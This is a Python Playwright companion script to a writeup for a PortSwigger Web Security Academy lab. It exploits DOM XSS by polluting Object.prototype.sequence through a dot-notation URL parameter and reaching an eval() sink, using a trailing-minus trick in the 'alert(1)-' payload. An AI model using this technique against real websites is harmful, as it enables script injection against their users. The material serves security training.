#!/usr/bin/env python3
"""
DOM XSS via an alternative prototype pollution vector
PortSwigger Web Security Academy -- Client-Side Prototype Pollution

Companion script for the writeup: 03-dom-xss-via-an-alternative-prototype-pollution-vector.md

What this does:
    Confirms that the bracket-notation source (?__proto__[foo]=bar) fails on
    this page, then confirms the dot-notation source (?__proto__.foo=bar)
    that the page's jQuery-style parser actually accepts. Pollutes
    Object.prototype.sequence, which searchLoggerAlternative.js feeds
    straight into an eval() call. The naive alert(1) payload fails because
    the app appends '1' to whatever manager.sequence holds before eval'ing
    it (alert(1)1 is a syntax error) -- so the payload ends in a trailing
    minus sign, making the appended '1' resolve to the harmless subtraction
    alert(1)-1 instead of breaking the syntax. Requires a real browser
    engine (Playwright) since the pollution, the eval() sink, and the
    numeric-append behavior only exist in client-side JS.

Usage:
    python 03-dom-xss-via-an-alternative-prototype-pollution-vector.py <lab-url>
    e.g. python 03-dom-xss-via-an-alternative-prototype-pollution-vector.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install playwright && playwright install chromium
"""

import sys
import time

from playwright.sync_api import sync_playwright


def solve(lab_url: str) -> None:
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        dialogs = []
        page.on("dialog", lambda d: (dialogs.append(d.message), d.accept()))

        # Bracket notation is the first thing to try -- and the first thing this lab blocks.
        page.goto(f"{lab_url}/?__proto__[foo]=bar", wait_until="networkidle")
        bracket_result = page.evaluate("() => Object.prototype.foo")
        if bracket_result == "bar":
            print("[!] Bracket notation unexpectedly worked -- this script targets the dot-notation lab")
        else:
            print("[*] Bracket notation confirmed dead (Object.prototype.foo is undefined), as expected")

        # Dot notation is what this lab's parser actually accepts.
        page.goto(f"{lab_url}/?__proto__.pptest=confirmed", wait_until="networkidle")
        dot_result = page.evaluate("() => Object.prototype.pptest")
        if dot_result != "confirmed":
            print("[-] Dot-notation source did not pollute Object.prototype -- aborting.")
            browser.close()
            return
        print("[+] Source confirmed: ?__proto__.foo=bar pollutes Object.prototype")

        # Trailing minus trick: the app appends '1' to manager.sequence before eval(),
        # so alert(1)- becomes alert(1)-1 -- valid JS that still fires the alert.
        exploit_url = f"{lab_url}/?__proto__.sequence=alert(1)-"
        print(f"[*] Navigating to: {exploit_url}")
        page.goto(exploit_url, wait_until="networkidle")
        time.sleep(2)  # let the eval() sink run

        if dialogs:
            print(f"[+] alert() fired: {dialogs[0]!r} -- sequence gadget reached eval()")
        else:
            print("[-] No alert() observed -- gadget may not have fired")

        check = page.goto(lab_url, wait_until="networkidle")
        html = check.text() if check else ""
        if "Congratulations" in html:
            print("[+] Lab solved.")
        else:
            print("[-] Not solved yet.")
        browser.close()


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
